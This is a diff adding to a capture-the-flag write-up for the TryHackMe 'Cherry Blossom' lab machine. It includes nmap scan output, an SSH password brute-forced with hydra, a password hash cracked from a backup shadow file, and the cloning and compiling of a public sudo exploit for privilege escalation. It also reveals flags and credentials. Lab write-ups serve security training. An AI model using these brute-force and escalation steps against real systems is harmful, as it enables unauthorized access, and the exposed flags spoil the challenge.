@@ -5,7 +5,78 @@
 command:```sudo nmap -A 10.10.244.236 -T4  -v -p-```
 
 ```
+# Nmap 7.93 scan initiated Sat May 13 12:23:09 2023 as: nmap -A -T4 -v -p- -oN cherry_blossom 10.10.244.236
+Increasing send delay for 10.10.244.236 from 0 to 5 due to 1624 out of 4059 dropped probes since last increase.
+Increasing send delay for 10.10.244.236 from 5 to 10 due to 11 out of 16 dropped probes since last increase.
+Nmap scan report for 10.10.244.236
+Host is up (0.20s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 21ee304ff8f79f326e4295f21a1a04d3 (RSA)
+|   256 dcfcded6ec436100549b7c401e8f52c4 (ECDSA)
+|_  256 1281256e0864f6eff50c58711838a5c6 (ED25519)
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.93%E=4%D=5/13%OT=22%CT=1%CU=41148%PV=Y%DS=2%DC=T%G=Y%TM=645F76A
+OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=I%TS=A)SEQ(SP=1
+OS:06%GCD=1%ISR=10B%TI=Z%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=I%II=I%
+OS:TS=A)OPS(O1=M506ST11NW6%O2=M506ST11NW6%O3=M506NNT11NW6%O4=M506ST11NW6%O5
+OS:=M506ST11NW6%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=
+OS:68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%
+OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0
+OS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S
+OS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
+OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
+OS:%T=40%CD=S)
 
+Uptime guess: 32.219 days (since Tue Apr 11 07:22:43 2023)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=262 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: Host: UBUNTU; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: -19m59s, deviation: 34m37s, median: 0s
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| nbstat: NetBIOS name: UBUNTU, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
+| Names:
+|   UBUNTU<00>           Flags: <unique><active>
+|   UBUNTU<03>           Flags: <unique><active>
+|   UBUNTU<20>           Flags: <unique><active>
+|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
+|   WORKGROUP<00>        Flags: <group><active>
+|   WORKGROUP<1d>        Flags: <unique><active>
+|_  WORKGROUP<1e>        Flags: <group><active>
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2023-05-13T11:38:01
+|_  start_date: N/A
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+|   Computer name: cherryblossom
+|   NetBIOS computer name: UBUNTU\x00
+|   Domain name: \x00
+|   FQDN: cherryblossom
+|_  System time: 2023-05-13T12:38:01+01:00
+
+TRACEROUTE (using port 143/tcp)
+HOP RTT       ADDRESS
+1   239.38 ms 10.18.0.1
+2   239.43 ms 10.10.244.236
+
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat May 13 12:38:08 2023 -- 1 IP address (1 host up) scanned in 899.74 seconds
 ```
 From our scan, we have 3 opened ports. Port 22 which runs ssh, port 139&445 which runs netbios. We'll be starting our enumeration from the smb ports.
 
@@ -332,7 +403,24 @@ abeg.txt  crypt.py  hehe.txt  __init__.py  Journal.ctd  Journal.ctz  _journal.zi
 └─$ file Journal.ctd 
 Journal.ctd: XML 1.0 document, ASCII text, with very long lines (61172)
 ```
-After extracting we got the file ```Journal.ctd```. I'll be opening this file using the text editor ```gedit```
+After extracting we got the file ```Journal.ctd```. 
+
+To get the flag for the first question, just check the end of ```Journal.ctd``` file or you can choose to use the ```strings``` command.
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/…/TryHackMe/Cherry_Blossom/stegpy/stegpy]
+└─$ ls
+abeg.txt  crypt.py  hehe.txt  __init__.py  Journal.ctd  Journal.ctz  _journal.zip  lsb.py  __pycache__  steg.py  test.npy  tests.py
+                                                                                                                                                                                                                                
+┌──(bl4ck4non㉿bl4ck4non)-[~/…/TryHackMe/Cherry_Blossom/stegpy/stegpy]
+└─$ strings Journal.ctd | grep -i "thm{"                                        
+THM{054a8f1db7618f8f6a41a0b3349baa11}</rich_text>
+```
+FLAG:- ```THM{054a8f1db7618f8f6a41a0b3349baa11}```
+
+Now, that we've solved the first question lets move on to the second question which is getting the user flag. 
+
+TO do this I'll be opening this file using the text editor ```gedit```
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/38292f1b-2d7f-440e-8b76-89aa5e98145d)
 
@@ -344,7 +432,129 @@ Moving on you should see something that looks like this.
 
 This looks like a wordlist, but the content are base64 encoded. There was a discussion where the author talked about the wordlist cherry-blossom.
 
-What we'll do is decoding the base64 encoded texts, save it in a ```.txt``` file, then we'll use the password to bruteforce 
+What we'll do is decoding the base64 encoded texts, save it in a ```.txt``` file, if you recall we had possible usernames when were doing our enumeration. So, we'll use a tool called ```hydra``` to look for possible usernames and passwords.
+
+First, lets decode the base64 encoding using [cyberchef](https://gchq.github.io/CyberChef/).
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bd2e1b2f-c6ee-4017-ab60-6f253b94a772)
+
+Lets go ahead and paste the output in a file, lets say ```cherry-blossom.txt```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/43f10679-ae6e-477e-b032-88dc474bfac5)
+
+So, we'll be using this password combination on the username ```lily```. This is to see if we can find the password for the ssh server.
+
+command:```hydra -l lily -P cherry-blossom.txt ssh://10.10.231.170```
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/Cherry_Blossom]
+└─$ hydra -l lily -P cherry-blossom.txt ssh://10.10.231.170 
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-13 18:17:23
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 9040 login tries (l:1/p:9040), ~565 tries per task
+[DATA] attacking ssh://10.10.231.170:22/
+[STATUS] 83.00 tries/min, 83 tries in 00:01h, 8960 to do in 01:48h, 13 active
+[STATUS] 82.33 tries/min, 247 tries in 00:03h, 8796 to do in 01:47h, 13 active
+[STATUS] 77.43 tries/min, 542 tries in 00:07h, 8501 to do in 01:50h, 13 active
+[22][ssh] host: 10.10.231.170   login: lily   password: Mr.$un$hin3
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 3 final worker threads did not complete until end.
+[ERROR] 3 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-05-13 18:26:21
+```
+cool stuff, we found the  password to be ```Mr.$un$hin3```. Lets use this to login to the ssh server
+
+```username:lily```             ```password:Mr.$un$hin3```
+
+command:```ssh lily@10.10.231.170```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/338079de-749b-4aff-a1f4-a6dcc4603463)
+
+cool, we are logged in as user ```lily```. Now, lets go ahead and escalate our privileges.
+
+
+
+
+# Privilege Escalation
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/98dccc01-8190-4feb-a7c4-22c94b14e14d)
+
+We got something interesting in the ```/var/backups``` directory hehe. Why is this interesting?? Well, it is because we can view the ```shadow.bak``` file which contains the hashed passwords of users available on the machine.
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6e91ce14-98b2-4b90-8500-aee382e1c317)
+
+Lets try to crack user ```johan``` password using a tool called ```John the Ripper```. Well, John already left the party so I had to call him back to help us out with this.
+
+command:```john abeg  --wordlist=cherry-blossom.txt```
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/Cherry_Blossom]
+└─$ john abeg  --wordlist=passwords.txt  
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+##scuffleboo##   (johan)     
+1g 0:00:00:03 DONE (2023-05-13 19:02) 0.2732g/s 1958p/s 1958c/s 1958C/s #sharry#1992..#iloveyou#
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+Now, lets switch to user ```johan``` using the password John found for us
+
+command:```su johan```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/003a9d9e-f6e7-4476-9548-e8df4fb69a90)
+
+cool hehe😎. Lets further escalate our privileges
+
+Using the ```uname -a``` command to display system information. 
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5e0cc171-c6ae-4ccf-8749-c5b5a7a6f35a)
+
+There seems to be an exploit available for the version of Ubuntu. You can access it [here](https://github.com/saleemrashid/sudo-cve-2019-18634)
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0b19422d-c023-41ba-8fc0-148b9bb93d2f)
+
+clone this to your machine and compile
+
+```
+                                                                                                                                                                       
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/Cherry_Blossom]
+└─$ git clone https://github.com/saleemrashid/sudo-cve-2019-18634.git     
+Cloning into 'sudo-cve-2019-18634'...
+remote: Enumerating objects: 30, done.
+remote: Counting objects: 100% (30/30), done.
+remote: Compressing objects: 100% (21/21), done.
+remote: Total 30 (delta 14), reused 22 (delta 8), pack-reused 0
+Receiving objects: 100% (30/30), 5.95 KiB | 5.95 MiB/s, done.
+Resolving deltas: 100% (14/14), done.
+                                                                                                                                                                       
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/Cherry_Blossom]
+└─$ cd sudo-cve-2019-18634
+                                                                                                                                                                       
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/Cherry_Blossom/sudo-cve-2019-18634]
+└─$ ls 
+exploit.c  LICENSE  Makefile  README.md
+                                                                                                                                                                       
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/Cherry_Blossom/sudo-cve-2019-18634]
+└─$ gcc exploit.c -o exploit                                         
+                                                                                                                                                                       
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/Cherry_Blossom/sudo-cve-2019-18634]
+└─$ ls
+exploit  exploit.c  LICENSE  Makefile  README.md
+```
+Now, lets send the compiled exploit named ```exploit``` to the target's machine
+
+
+
+
+
+
 
 
 
